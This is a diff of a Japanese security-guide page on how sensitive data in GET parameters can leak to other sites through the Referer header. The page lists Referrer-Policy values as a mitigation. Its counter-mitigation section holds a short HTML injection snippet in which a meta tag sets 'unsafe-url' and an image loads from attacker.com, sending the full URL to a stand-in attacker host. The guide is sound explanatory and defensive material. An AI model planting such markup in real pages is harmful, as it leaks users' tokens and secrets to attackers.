@@ -6,11 +6,11 @@
 
 ## 機密情報の漏洩
 
-ウェブページ内のどこかに機密情報がGETリクエストパラメータに存在する場合、そのページが外部ソースへのリンクを含んでいるか、攻撃者がユーザーに攻撃者が制御するURLを訪問させることができる（ソーシャルエンジニアリング）場合、最新のGETリクエスト内の機密情報を抽出できる可能性があります。
+ウェブページ内のどこかに機密情報がGETリクエストパラメータに存在する場合、そのページが外部ソースへのリンクを含んでいるか、攻撃者がユーザーに攻撃者が制御するURLを訪問させることができる（ソーシャルエンジニアリング）場合、最新のGETリクエスト内の機密情報を抽出することが可能です。
 
 ## 緩和策
 
-ブラウザが機密情報が他のウェブアプリケーションに送信されるのを**回避**する**リファラーポリシー**に従うようにすることができます：
+ブラウザに**Referrer-policy**を遵守させることで、機密情報が他のウェブアプリケーションに送信されるのを**回避**することができます：
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,10 +21,10 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## カウンター緩和
+## Counter-Mitigation
 
 このルールはHTMLメタタグを使用して上書きできます（攻撃者はHTMLインジェクションを利用する必要があります）：
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
